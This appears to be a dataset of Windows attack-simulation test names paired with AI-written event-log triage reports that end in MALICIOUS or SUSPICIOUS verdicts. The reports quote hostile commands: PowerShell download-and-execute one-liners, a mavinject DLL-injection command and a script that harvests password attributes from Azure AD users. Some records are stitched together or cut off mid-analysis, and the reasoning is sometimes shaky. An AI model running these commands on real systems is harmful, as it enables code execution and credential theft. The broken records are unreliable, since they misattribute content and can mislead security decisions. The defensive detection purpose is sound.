WinPwn - Kerberoasting,"Upon reviewing the provided Windows event logs, I have identified the following observations:

1. **PowerShell Activity**:
   - There is an execution of PowerShell with a command to download and execute a script from a GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This is evident from the Sysmon Event ID 1 (Process Create) and Windows PowerShell logs.
   - This behavior is suspicious as it indicates remote code execution, which is often used in a variety of attacks to download and execute malicious payloads.

2. **Wevtutil and Conhost Executions**:
   - There are several instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` processes being executed by the user ""SERVER002\admin_test"" in a short period. While this could be benign, frequent, and close consecutive executions of `wevtutil.exe` might suggest an attempt to tamper with event logs to cover tracks of malicious activity.

3. **Time Change Events**:
   - Security and System logs indicate changes in system time with Event ID 4616 and corresponding Kernel-General Event ID 1. Frequent time changes can be indicative of attempts to manipulate timestamps for logs to obfuscate activity timing.

4. **Edge Update Activity**:
   - Various processes related to Microsoft Edge Update are noted, including the update setup and execution commands. This activity appears standard for browser updates and does not indicate suspicion by itself.

5. **Network Service Executions**:
   - The `C:\Windows\System32\sppsvc.exe` is related to the Software Protection Platform Service and runs under the NETWORK SERVICE account. Its execution seems consistent with legitimate operations and activation services.

**Assessment**:
The discovery of PowerShell executing a remote script points to the possibility of malicious activity. It is a common tactic for attackers to leverage PowerShell scripts for lateral movement, data exfiltration, or installing backdoors. This, combined with the rapid and repeated execution of event utility processes, suggests potential unauthorized or malicious activities on the host.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the involved host (`Server002`) from the network to prevent any potential damage or data exfiltration.
- Conduct a comprehensive investigation into the downloaded script by searching for its signature or inspecting the intended actions using a forensic method (sandboxing the script in a controlled environment, for example).
- Verify the integrity of other connected systems to ensure no further compromise has occurred.
- Review and reinforce security policies and user privilege management to prevent similar occurrences.
- If applicable, inform senior management and prepare for incident response and remediation steps."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,"Upon analyzing the provided Windows event logs, there are several critical observations that stand out as potential indicators of malicious activity.

1. **PowerShell Script Execution**:
   - The `powershell.exe` process was executed with a command to download and execute a script from GitHub: `https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1`. This script then performs a function known as `asreproast`, which is a known attack technique used to request authentication data that can be later cracked offline.
   - This is highly indicative of malicious activity as it involves downloading a script from an external source and executing it without any apparent legitimate reason.

2. **High Integrity Level and User Privileges**:
   - The PowerShell activity was performed under a high integrity level with the user `SERVER002\admin_test`. High integrity processes typically denote processes that can perform tasks requiring elevated privileges, which makes them more capable targets for malicious actors.
   
3. **Frequent Use of System Utilities**:
   - Frequent execution of `C:\Windows\System32\whoami.exe` and `C:\Windows\System32\wevtutil.exe` were logged. While these can be legitimate, they can also be used by attackers for reconnaissance purposes and clearing event logs, respectively.

4. **Potential Time Manipulation**:
   - There are multiple Security logs (Event ID: 4616) indicating that the system time was changed. Such actions are often attempts to cover tracks when conducting malicious activities.

In summary, the logs present a clear and concerning pattern of behavior consistent with malicious activity. Specifically, the downloading and execution of external PowerShell scripts for potentially malicious purposes are serious concerns. Additionally, the high integrity level under which these actions were performed exacerbates the risk as it enables potential system compromises.

### Resolution:
**MALICIOUS** - The logs indicate definitive signs of malicious activity, particularly involving unauthorized use of PowerShell to download and execute potentially harmful scripts. Immediate actions should be taken to investigate further, mitigate potential damages, and secure the system to prevent further intrusions."
WinPwn - BrowserPwn,"Based on the analysis of the provided logs, several points of interest stand out, predominantly centered on PowerShell activities:

1. **PowerShell Execution with a Suspicious Command Line**:
   - In the Sysmon and Windows PowerShell logs, there is an instance of PowerShell being executed with a command that downloads and executes a script from GitHub: 
     ```powershell
     PowerShell.exe & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), browserpwn -consoleoutput -noninteractive}
     ```
   - The use of `iex(new-object net.webclient).downloadstring` is highly suspicious as it suggests the downloading and execution of code from a potentially untrusted source, which is a common tactic used in malware delivery and execution.

2. **Execution of Command-Line Tools**:
   - The Sysmon log indicates the execution of several command-line tools such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe`, which in isolation may not be suspicious. However, the context in which they run can be indicative of enumeration activities, often seen in lateral movement or post-exploitation scenarios.

3. **Unusual Activity by `admin_test`**:
   - The user account `admin_test` is executing several instances of tools like `whoami.exe`, `hostname.exe`, and PowerShell scripts. This sequence resembles activities performed during privilege escalation or reconnaissance phases in a cyberattack.

**Assessment**:
- The presence of the PowerShell execution to download and run a remote script is a major red flag. 
- Coupled with several command-line executions, this behavior suggests possible post-exploitation or lateral movement activities.
  
**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Measures**:
   - Isolate the machine `Server002` to prevent any potential spread.
   - Thoroughly check the source and contents of the GitHub-hosted script for malicious code.

2. **Investigation**:
   - Conduct a comprehensive review of user account `admin_test` for any anomalies and unauthorized access or privilege escalation.
   - Analyze network logs for unusual outbound connections, especially those pointing to GitHub or any associated IPs.
   - Review activity around the PowerShell execution timestamp for any other indicators of compromise.

3. **Mitigation**:
   - Revoke and re-issue credentials for affected accounts.
   - Update security measures for scripting and execution policies to avoid unauthorized scripts execution.
   - Enhance monitoring for similar patterns or behaviors in other hosts in the network.

4. **Reporting**:
   - Document findings thoroughly and escalate to higher authorities or security teams for a coordinated response and possible forensic investigation. 

Taking these actions will help in containing and addressing the malicious activities identified in these logs."
Stage Popular Credential Files for Exfiltration,"Upon analysis of the provided Windows event logs, the following observations and conclusions have been made:

1. **Security Log**:
   - There are multiple instances where the user 'admin_test' gains special privileges such as 'SeSecurityPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', and others. While these might be legitimate if the user is an admin, the continuous and possibly automated nature of these actions, particularly involving privileges like 'SeDebugPrivilege', might indicate attempts at privilege escalation or preparation for unauthorized actions.
   - There are logon events using NTLM authentication from workstation 'DESKTOP-3HL5B2P' with an IPv6 address. NTLM usage in a secure environment might be discouraged, as it could be susceptible to relay attacks.

2. **Sysmon Log**:
   - There is the execution of `whoami.exe`, `hostname.exe`, and `powershell.exe` by the user 'admin_test’, which may not be immediately suspicious. However, the PowerShell command is of particular interest as it attempts to access browser credentials (Firefox, Chrome, Opera, and Edge), which is a likely indicator of credentials harvesting behavior.
   - The identified PowerShell script is highly suspicious as it attempts to copy credential files and compress them, possibly for exfiltration.

3. **Windows PowerShell Log**:
   - The PowerShell commands executed involve creating a directory, copying potentially sensitive files related to stored browser credentials, and compressing these files, which is indicative of data exfiltration attempts via a script.

Based on these observations, particularly the PowerShell activity indicating credential harvesting and potential data exfiltration, this analysis concludes:

**Resolution**: MALICIOUS

**Recommendations**:
- Immediately investigate the origin and purpose of the script executed by 'admin_test'. Verify if this was a legitimate admin script.
- Review network logs to identify any unusual data transmission that corresponds with the timeline of these events.
- Consider resetting passwords and reviewing permissions for the 'admin_test' account and other potentially affected user accounts.
- Enhance monitoring on this system and evaluate any other anomalous behavior throughout the network that corresponds with similar activities.
- Update security policies and intrusion detection systems to monitor the execution of suspicious scripts and privilege escalations."
WinPwn - Loot local Credentials - Wifi Credentials,"Upon analyzing the provided Windows event logs, the following assessments can be made:

### Security Logs:
- **EventID 4616 (Time Change):** These events indicate system time changes made by the ""LOCAL SERVICE"". Time adjustments are usually expected in server environments due to synchronization with a time source. These appear benign as they are attributed to the windows service ""svchost.exe"".

### PowerShell Logs:
- **EventID 600 (PowerShell Activity):** There is a significant indicator of potentially malicious activity within these logs. The presence of a PowerShell command that uses `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')` suggests remote code execution. This command downloads and executes a script from a remote URL, typical of PowerShell-based malware or attack vectors. Additionally, the `wificreds -consoleoutput -noninteractive` command suggests an attempt to extract WiFi credentials, which is highly suspicious.

### Sysmon Logs:
- **Process Creation Events (EventID 1 & 5):** Observations show various system and application-related process creations. Notably:
  - Legitimate processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` were executed by the user ""SERVER002\\admin_test"", which appears normal unless this user account was compromised.
  - The frequent invocation of the Microsoft Edge Update processes under `NT AUTHORITY\\SYSTEM` suggests legitimate software updates, matching expected behavior for automatic browser updates.

### System and Application Logs:
- **System Logs:** Consist of kernel operations, time updates, and legitimate service operations, showing no immediate red flags.
- **Application Logs:** Primarily reflect Windows Defender operations and Microsoft Edge update processes. They don't show any anomalies related directly to cyber threats.

### Assessment:
The combination of using PowerShell to download scripts from a remote source and attempting to execute potentially sensitive information-gathering scripts (`wificreds`) is consistent with common attack patterns involving PowerShell. The repeated execution of such commands suggests that the host has likely been compromised to perform malicious activities.

### Resolution:
Based on the PowerShell activity:
- **Resolution:** MALICIOUS

### Recommendations:
1. **Immediate Isolation:** Isolate the affected host from the network to prevent further malicious activities or lateral movement.
2. **Conduct Full Malware Scan:** Use updated antivirus and antimalware solutions to scan and remediate any malicious scripts or backdoors.
3. **Review PowerShell Policies:** Enforce stricter PowerShell execution policies to prevent unauthorized scripts from executing.
4. **Investigate User Account Activity:** Review the activities of the user ""SERVER002\\admin_test"" to identify unauthorized access; consider resetting passwords.
5. **Network Traffic Analysis:** Examine network traffic logs to identify any data exfiltration or further indicators of compromise linked to malicious PowerShell commands.
6. **Security Awareness Training:** Train staff to recognize phishing and unauthorized scripts execution to minimize risk of future attacks.

Addressing these recommendations will help mitigate the current threat and protect against similar future threats."
Trigger an authenticated RPC call to a target server with no Sign flag set,"### Analysis of Windows Event Logs

Upon reviewing the event logs provided from the Windows machine `Server002`, several key observations and potential indicators of suspicious activity were identified. 

#### PowerShell Logs
- **PowerShell Execution**: The repeated execution of `powershell.exe` with the command line containing `{rpcping -s 127.0.0.1 -e 9997 /a connect /u NTLM 1>$Null}` is observed. This use of `rpcping` with NTLM authentication may indicate probing or testing of remote procedure call (RPC) endpoints, which could potentially be used for lateral movement or reconnaissance within the network. This is often a technique used by malicious actors to discover and exploit services.
  
#### System Logs
- **Time Service Event**: A routine time synchronization event with `time.windows.com` is logged, which is a standard system task and shows no signs of tampering or anomaly.

#### Sysmon Logs
- **Process Creation**: The creation of numerous processes such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` in close succession is somewhat normal; however, the context in which PowerShell interactions are occurring makes this sequence worth further examination.
  
- **Microsoft Edge Update Activity**: The `MicrosoftEdgeUpdate.exe` and related components exhibit frequent execution commands. The Edge Update processes running under `NT AUTHORITY\SYSTEM` indicate routine system tasks, which involve updates and maintenance on the Microsoft Edge browser. The provided command lines for these processes reflect legitimate update operations.

- **RPC Ping Utility Execution**: The execution of `RpcPing.exe` with parameters close to those observed from PowerShell is notable. This process originates from PowerShell executions, which suggests scripting or automation that can be used in attacks.

#### Application Logs
- **Service Stopping Events**: Multiple logs indicating Microsoft Edge Update services starting and stopping normally suggest routine updates or intermittent service activity.

### Assessment

Based on the analysis:
- The PowerShell activity involving `rpcping` is unusual and potentially indicative of malicious activity. Combined with the high-level integrity at which the PowerShell script runs, this command pattern might be used in exploit or reconnaissance activities.
- The activity involving Microsoft Edge updates appears routine and consistent with typical system operations.
- Frequent executions of system utilities such as `wevtutil` and `whoami` generally appear benign in isolation but warrant closer inspection in this context given the suspicious PowerShell activity.

### Conclusion

The provided logs contain activities, particularly concerning PowerShell with `rpcping`, that are potentially suspicious and require further investigation to rule out any compromise or hidden malicious activity.

### Resolution
- **SUSPICIOUS**: The logs exhibit activity that doesn't look right (especially the `rpcping` invocation under PowerShell context) and thus requires further analysis, such as:
  - Reviewing additional logs to investigate the preceding and following activities.
  - Checking for any unexpected network behavior or unauthorized data access linked with the host in question.
  - Conducting a more in-depth forensic analysis to evaluate if the actions were testing or exploitation attempts by an authorized or unauthorized party."
Request A Single Ticket via PowerShell,"### Detailed Log Analysis:

**1. Analysis of Processes and Activities:**

- **PowerShell Activity:** 
  The Sysmon log entries indicate multiple executions of `powershell.exe` by the user `SERVER002\admin_test` in a short span of time. Notably, the PowerShell command includes `Add-Type -AssemblyName System.IdentityModel`, which is often used for scripting purposes but could be suspicious in identifying token-based authentication, potentially indicating investigation or attack actions on the network or system. This activity is not conclusively malicious but raises a red flag considering a lack of a typical administrative task context and known scheduled scripts.

- **Use of `wevtutil.exe`:**
  The consistent invocation of `wevtutil.exe`, a legitimate utility used for Windows Event Log management by the same user within a few seconds, could imply cleaning or tampering with log files to hide malicious activities. However, no further context like deletion events or configuration changes is evident from this data alone.

- **`whoami.exe` Usage:**
  The presence of `whoami.exe` being executed is common in scripts or manual audits to verify the current user's identity and roles. Given the close timestamps to PowerShell activities, it might be a part of potential recon activity, aligning with benign administrative tasks but also suitable for reconnaissance in a malicious setting.

- **EdgeUpdate Processes:**
  Multiple executions of `MicrosoftEdgeUpdate.exe` and related activities are present. The invocations seem to follow normal updates or registration processes for Microsoft Edge. This is consistent with scheduled or initiated updates and doesn’t appear to be intended for any nefarious purpose.

**2. Context on Event Logs:**

- **Log Tampering Indicators:**
  The use of `wevtutil.exe`, especially when bundled with other potentially suspect activity, could suggest potential log manipulation. However, without additional confirmation of log deletion or WevtUtil commands specifically targeting log configurations or clear settings, this cannot be definitively concluded as malicious.

- **General User Activities:**
  Although the user `SERVER002\admin_test` is heavily involved, much of this activity could stem from authorized administrative tasks, particularly given the high integrity levels noted and commands run under a legitimate administrative account context.

**Final Assessment:**
Based on the provided logs and the existing contexts:

- **Resolution: SUSPICIOUS**

The combination of indicators suggests an alignment with possibly benign administrative functions but lacks the definitive context to rule out malicious intentions, especially concerning the unconventional PowerShell usage and system utilities in rapid succession. While typical software updates and queries (e.g., `whoami`) are present, the actions necessitate more detailed analysis and potential threat hunting to rule out any malfeasance completely.

**Guidance on Next Steps:**

- **Enhanced Monitoring:**
  Continue monitoring the involved user account and processes for further anomaly patterns.

- **Conduct Host Investigation:**
  Review task schedules, policies, or scripts that might rationalize or deny such activities to ascertain genuine behavior versus unauthorized access.

- **Review Event Logs:**
  Inspect closely for any further `wevtutil.exe` logs that suggest tampering or unexpected renovations, along with any administrative alerts in the security logs not previously captured.

- **Credential and Log Review:**
  Assess the integrity, login sessions, and associated administrative controls around the user in question to ensure credential misuse has not occurred."
"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials","Upon reviewing the provided logs, the following observations have been made:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution**: 
   - There are multiple instances of PowerShell starting with a command that downloads a script from a public GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`) and executes it with `SharpCloud -consoleoutput -noninteractive`.
   - This behavior is suspicious as invoking PowerShell to download scripts from an external source without specific legitimate reasons is a common tactic used by attackers.

2. **Use of Elevated Permissions**:
   - The PowerShell commands are executed with `High` Integrity Level by the user `SERVER002\admin_test`, indicating administrative rights.
   - This increases the potential impact if the executed script is malicious.

3. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes executed by the user `SERVER002\admin_test`. Although these processes on their own are normal, without knowing the context these frequent executions within a short time window are worth noting for further investigation.

4. **Edge Update Activities**:
   - Several processes related to `MicrosoftEdgeUpdate.exe` are active, but this is generally normal behavior for software updates.

### Assessment:

- The critical concern here is the PowerShell activity that appears potentially malicious:
  - Execution of remote scripts using PowerShell without proper context or verification is a known method of initializing an attack.
  - The script is downloaded from an unrestricted internet location which could lead to an unauthorized or harmful code execution on the system.
  
- The presence of these activities in a high-integrity context executed by an administrative user is considered risky and a high security risk. 

### Threats or Risks Identified:

- **Potential Execution of Malicious Code**: The script fetched over the internet could compromise the system.
- **Unauthorized Changes to the System**: If the script contains harmful instructions, it could modify system configurations, exfiltrate data, or establish persistence mechanisms.

### Guidance on How to Proceed:

1. **Immediate Action**:
   - Terminate the suspicious PowerShell sessions if still active.
   - Conduct a detailed review of the script content downloaded from the URL.
   - Check if any suspicious processes or network connections have been spawned from this activity.

2. **Investigation and Remediation**:
   - Isolate the host from the network until a full investigation has been completed.
   - Scan the system thoroughly using updated antivirus and endpoint detection tools.
   - Analyze system changes made during the time window of these events.

3. **Preventive Measures**:
   - Implement monitoring to alert on similar PowerShell executions in the future.
   - Restrict administrative accounts from executing scripts without explicit approval and logging.
   - Conduct security awareness training for users on the risks associated with executing external scripts.

### Resolution:

Given the PowerShell activity with high integrity and unusual external script download, the activities in the logs should be classified as **MALICIOUS**. Immediate action and thorough investigation are required to ensure system integrity and security."
Hook PowerShell TLS Encrypt-Decrypt Messages,"Based on a detailed examination of the provided logs from the Windows host, here is the assessment:

1. **Suspicious PowerShell Activity**: The Sysmon and PowerShell logs reveal a suspicious PowerShell execution:
   - The command involves `mavinject`, which is used to manipulate processes in memory, potentially for injection.
   - The execution of `Invoke-WebRequest` to download or access external resources (e.g., from ""https://www.example.com"") is commonly seen in malicious scripts aiming to communicate with external servers.
   - The PowerShell command `""powershell.exe"" & {mavinject $pid /INJECTRUNNING \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\data.004x64.dll\""}` suggests an attempt to inject a DLL into a running process, indicating potential malware deployment or post-exploitation action.

2. **Time Anomaly**: The logs indicate a time rollback event (`EventID: 4616` in Security logs; `EventID: 1` in System logs) around `18:57:18`, where system time is reverted from `18:57:44`. This anomaly could potentially be abused for evasion, such as hiding process creation times or event logs.

3. **High Integrity Level for Suspicious Commands**: PowerShell and other command executions occurred with high integrity, as seen in the Sysmon logs. This privilege level elevates the risk of the actions being severe and successful.

4. **Widespread High Privilege Events**: Multiple events show the use of high-privilege user accounts such as admin_test and SYSTEM, running potentially dangerous processes (e.g., `wevtutil.exe`, `svchost.exe`, `conhost.exe`) possibly linked to attempts for privilege escalation or malicious activities with administrative rights.

5. **Network-based Access with Admin Privileges**: NTLM logons over the network (`LogonType 3` in Security logs) by admin_test raise suspicion. This might suggest a lateral movement attempt or unauthorized remote access.

Based on these findings, the presence of suspicious PowerShell activity, potential time manipulation, and privileged account usage for potentially malicious processes indicate a high likelihood of compromise.

**Resolution: MALICIOUS**
  
**Guidance on How to Proceed:**
- **Immediate Isolation**: Consider isolating the server immediately from the network to prevent further spread or data exfiltration.
- **Conduct Thorough Investigation**: Investigate any associated user accounts and IPs involved in remote logins.
- **Review and Revert System Changes**: Check for any unauthorized system changes and revert them.
- **Patch and Fortify Systems**: Ensure all systems are updated, and review security configurations and antivirus definitions.
- **Log Review and Monitoring**: Continue to audit logs for additional signs of compromise or unusual activities.
- **User Education and Password Rotation**: Educate users about phishing and enforce password changes and the use of multi-factor authentication.
- **Forensics and Incident Response**: If required, involve a forensics or incident response team to conduct a more comprehensive assessment."
Azure - Search Azure AD User Attributes for Passwords,"### Detailed Analysis of the Logs

Upon analyzing the provided logs, particularly focusing on the Windows PowerShell and Sysmon logs, I have identified several activities that are suspicious and indicative of potentially malicious behavior:

#### **Windows PowerShell Log:**

1. **Suspicious PowerShell Script Execution:**
   - The logs show multiple entries of PowerShell script execution which includes the command to:
     ```powershell
     import-module msonline
     $Password = ConvertTo-SecureString -String ""dataAz"" -AsPlainText -Force
     $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList """", $Password
     Connect-MsolService -Credential $Credential
     $users = Get-MsolUser -All;
     foreach($user in $users)
     {
       $props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
       foreach($prop in $props)
       {
         if($user.$prop -like ""*password*"")
         {
           (""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\data.005Test1.txt -append -force
         }
       }
     }
     get-content -path $env:temp\data.005Test1.txt -erroraction silentlycontinue
     ```
   - This script attempts to connect to the Microsoft Online service using hardcoded credentials, retrieve user information, and specifically searches for any properties related to passwords. It then writes this sensitive information to a file. This behavior is consistent with credential harvesting or reconnaissance by an attacker within an environment.

#### **Sysmon Log:**

2. **Correlated Process Execution:**
   - A PowerShell instance is launched (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by `SERVER002\admin_test` user, coinciding with the suspicious PowerShell script activity.
   - The use of processes such as `wevtutil.exe` and `conhost.exe` in rapid succession is often associated with attempts to manage or clear event logs, manipulate the console windows, or aid in the execution of scripts.

3. **Anomalous Activity Observed:**
   - The execution of `hostname.exe` and `whoami.exe` among others, which while legitimate, can be used as part of reconnaissance activities by an attacker exploring the system environment.
   - High Integrity Level for these processes indicates that they are running with elevated privileges, increasing the potential impact of the activities.

Run DSInternals Get-ADReplAccount,"This log analysis revolves primarily around the events recorded on the system named ""Server002,"" focusing on PowerShell and system processes as monitored by Sysmon.

### Key Observations:

#### PowerShell Logs:
- The PowerShell log displays several continuous entries related to the use of the `Get-ADReplAccount` cmdlet executed with a `powershell.exe` process. 
- The command `Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(""\\"")` suggests an action most likely related to retrieving account replication data from Active Directory using the server name obtained from the environment variable `$ENV:logonserver`.
- This specific PowerShell activity is not common for regular user operations and strongly indicates administrative or auditing activity.

#### Sysmon Logs:
- Multiple processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `whoami.exe` were started by the user ""SERVER002\\admin_test."" 
- `powershell.exe` and `wevtutil.exe` activities could signify legitimate administrative tasks but are often indicative of behavior linked with malicious activities such as log manipulation, data exfiltration, or attempts to obfuscate tracks by clearing logs.
- Events related to `whoami.exe` and administrative tools like `hostname.exe` can suggest user privilege checks or system information enumeration, a behavior sometimes associated with reconnaissance or pre-attack assessments.
  
### Assessment:
The logs indicate that there was considerable PowerShell execution involving commands related to Active Directory. This action was executed by a user with administrative rights and was followed by activity from other administrative-level command tools.

While the commands themselves may not inherently indicate malicious intent, they are unusual and could point to a threat actor performing reconnaissance or an insider threat extracting sensitive information. The lack of other types of logs makes it challenging to determine what these commands were aimed at achieving without further context or additional related artifacts.

### Conclusion:
Based on the provided logs, I would categorize this activity as **SUSPICIOUS**. Although no direct malicious intent can be confirmed, the actions warrant further investigation to rule out misuse of administrative privileges.

### Guidance:
1. **Further Investigation**: Conduct a deeper forensic analysis of this period, looking for any IP anomalies, related logins, or other red flags.
2. **User Verification**: Verify the legitimacy and role of ""SERVER002\\admin_test"" to ensure these actions align with their job duties.
3. **Audit Logs**: Review logs surrounding these events, if available, for more context, specifically if any modifications or exfiltration attempts were made.
4. **Monitoring**: Implement heightened monitoring on the user and similar activities to detect any signs of privilege misuse or data access abnormalities going forward."

Access Saved Credentials via VaultCmd,"After examining the provided Windows event logs from the security, Sysmon, application, and system logs, I have identified several noteworthy elements that could suggest suspicious activity. Here is the detailed analysis:

### Security Log Analysis
1. **Event ID 4616 and 4624**: Time changes were detected in Event ID 4616. This can indicate attempts to alter logs to cover tracks. The log also includes Event ID 4624, which registers a successful logon. A time discrepancy is noted indicating an unauthorized time change.

2. **Event ID 4672 and 4624 with `admin_test`**: Multiple instances of Event ID 4672 with potentially sensitive privileges such as `SeDebugPrivilege` and confirmed logons with admin privileges (Event ID 4624) are noteworthy. It's normal for administrators to have such privileges, but frequent occurrences in rapid succession can indicate privilege escalation attempts or active exploitation.

### Sysmon Log Analysis
1. **Command-Line Execution**: Usage of `vaultcmd` to list Windows credentials stands out. This could be legitimate but, combined with other indicators, could imply credential access by an unauthorized entity.

2. **Processes Executed**: Multiple executions of tools like `whoami.exe` to gather system information are being logged for `admin_test`, possibly indicating reconnaissance activities. 

3. **Process Chain Observed**: Hostname and `whoami` invocations might lead to usual benign activity; however, the presence of `vaultcmd` and frequent execution of system enumeration tools should be noted.

### System Log Analysis
1. **Frequent Time Adjustments**: The system log records frequent time adjustments (`EventID 1, Microsoft-Windows-Kernel-General`). Although the service `svchost.exe` might perform legitimate tasks, in combination with other logs, this can suggest attempts to obfuscate activities or alter log records.

### Assessment and Resolution
**Suspicious Activities Observed:**

- The combination of admin account activities with frequent successful logons, immediate enumeration commands (like `whoami`), and usage of `vaultcmd` to access Windows stored credentials could indicate unauthorized exploratory or malicious internal actor behavior.
- Time changes in the logs are particularly concerning as this points to an attempt to manipulate system times, likely to cover tracks or logs manipulation.

**Resolution: SUSPICIOUS**
- This assessment concludes with a ""SUSPICIOUS"" resolution. The activities observed could potentially be legitimate administrator actions, but they also hold characteristics of insider threat activities or compromise attempts. 

**Guidance:**
- Conduct further investigation to clarify the purpose and intent of actions taken using elevated privileges (`admin_test`). 
- Review the context prior and after the time adjustments for potential data tampering.

- Multiple processes related to system events are recorded, including `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and notably `powershell.exe` used with complex command-line arguments involving the execution of a remote script retrieved via Invoke-WebRequest (IWR).
- The PowerShell command line and the specific task being performed (certutil's usage for exporting a certificate to a PFX file) could be indicative of potential data exfiltration activities. This usage, particularly with scripts retrieved from non-official sources (such as GitHub), is often seen in malicious activities.

### Security Log:
- Several privileged operations and logons are noted. The presence of high-privilege SID actions (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`) may indicate potential privilege escalation or unusual behaviors warranting further investigation.
- The NTLM authentication and multiple logon events could be seen as typical, but they need context regarding the usual usage patterns for this user or system.

### System Log:
- Displays time change events which might potentially indicate tampering or synchronization issues; however, these could also result from legitimate maintenance or configuration updates.

### Windows PowerShell Log:
- Indicates a PowerShell session executing a script from a remote source alongside commands typically used in certificate manipulation. The host application leveraging Invoke-Expression (IEX) and certutil is highly suspect and often used for various attacks, including credential theft or lateral movement.

### Assessment:
- **SUSPICIOUS**: The primary indicator of potential malicious activity is the use of PowerShell to download and execute a remote script, combined with activity that involves exporting certificates which could lead to unauthorized access or data theft. While not conclusively indicating a breach without further insight into the context (such as whether this action was authorized or expected), these patterns resemble known attack tactics and warrant further investigation.

### Recommended Actions:
1. **Immediate Investigation**: Conduct deeper forensic analysis of the affected host, focusing on the PowerShell activity and any files or networking activities related to the involved script and its source.
2. **Review and Monitor**: Assess identity and access management logs and controls around the server, plus login and privilege patterns for unusual behaviors.
3. **Containment and Response**: If any breach is confirmed, isolate the system and engage incident response protocols focusing on eradication of unauthorized scripts and validation or reset of possibly compromised certificates or credentials. 

In summary, while some activities can be routine, the complexity and combination of certain logs indicate the potential for a security issue. Further investigation is needed to confirm any malicious activities."
Create Volume Shadow Copy with WMI,"Upon analyzing the provided Windows event logs, the following points were observed:

1. **Registry Querying and Command Execution:**
   - We observe multiple instances of `cmd.exe` being executed to query the registry and search for specific strings using `findstr`. These operations seem focused on querying the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions` registry key, checking for the value `ProductType` that may relate to server role/identification.
   - As part of normal operations, this might occur if a script or system check is being performed to determine the server's role (e.g., checking if it's a Domain Controller as implied by `LanmanNT` search).
   - Additionally, `cmd.exe` is used to echo a message, likely part of an administrative check or a script with an informational purpose (""Sorry, Promoting this machine to a Domain Controller must be done manually"").

2. **Shadow Copy Operations:**
   - The logs show the usage of `wmic` to create a shadow copy. This is something that could be used for legitimate backup and restore operations, but it also could be part of a preparation for an attack, such as a ransomware that uses shadow copies to attempt data recovery circumvention.

3. **Privilege Usage:**
   - Event ID 4672 denotes the enabling of special privileges for the NT AUTHORITY\SYSTEM, which is expected in contexts of system-level operations, but is necessary to highlight due to any potential misuse.

4. **Time Synchronization:**
   - Observations of time adjustments hint at synchronizations with an NTP server (`time.windows.com`), a typical operation for timekeeping, but worth noting if seen outside of normal conditions.

5. **Windows Update and Defender Operations:**
   - Multiple instances reflect the execution of update processes and antivirus signature installations, which is benign.

6. **Service and Process Executions:**
   - There are usual service operations (`svchost.exe`, `services.exe`), including ones associated with VSS (Volume Shadow Copy Service), indicative of standard maintenance or backup operations.
   
7. **Security Logins:**
   - Observations within Security Logs confirm logins and privilege elevations aligning with SYSTEM operations and attempts to access Microsoft Accounts, which result in failure (e.g., Event ID 5379 with return codes that might indicate a problem but aren’t necessarily malicious).

Based on the provided logs, while there are operations which could potentially be leveraged in an attack (like querying certain registry paths or creating shadow copies), there is no conclusive evidence pointing to malicious activity. However, certain actions such as shadow copy creation and registry querying warrant further scrutiny to ensure they were intended operations.

**Resolution: SUSPICIOUS**
- **Recommendation:** Close monitoring and further investigation are needed to confirm whether these operations are part of legitimate administrative tasks or potential unauthorized activities. Consider reviewing scripting logs, administrative tasks, and any unusual user behaviors around the time these logs were generated."
BrowserStealer (Chrome - Firefox - Microsoft Edge),"Based on the provided logs, a detailed investigation reveals several key observations:

1. **WMI Execution (wsmprovhost.exe):**
   - The `wsmprovhost.exe` process is seen as a parent process, which is part of Windows Management Instrumentation (WMI). This can be a potential vector for lateral movement, especially if it spawns unusual processes.

2. **PowerShell Execution:**
   - Multiple instances of `powershell.exe` are captured. PowerShell is a powerful scripting tool, often exploited by attackers. 
   - Particularly alarming is the PowerShell command that manipulates files related to Firefox profiles (`key4.db` and `logins.json`), possibly attempting to exfiltrate browser data.

3. **Suspicious PowerShell Script:**
   - The PowerShell command involves moving and removing critical files (`key4.db`, `logins.json`) from the Firefox profile directory, indicating possible credential theft.
   - The use of a custom executable `BrowserCollector.exe` suggests a tailored script for extracting and possibly transmitting user data.

4. **Frequent Use of System Tools:**
   - Tools such as `whoami.exe`, `hostname.exe`, and `conhost.exe` are called frequently, but their usage might be consistent with legitimate administrative tasks unless correlated with suspicious activities.

5. **Defensive Evasion:**
   - The presence of `wevtutil.exe` could hint at a potential log clearing or manipulation, often used by attackers to cover their tracks.

6. **Integrity of System Files:**
   - Although system binaries such as `whoami`, `hostname`, and `conhost` are hosted in `C:\Windows\System32\`, their frequent execution alongside potential malicious scripting suggests a need for deeper inspection.

7. **Security Tools Status:**
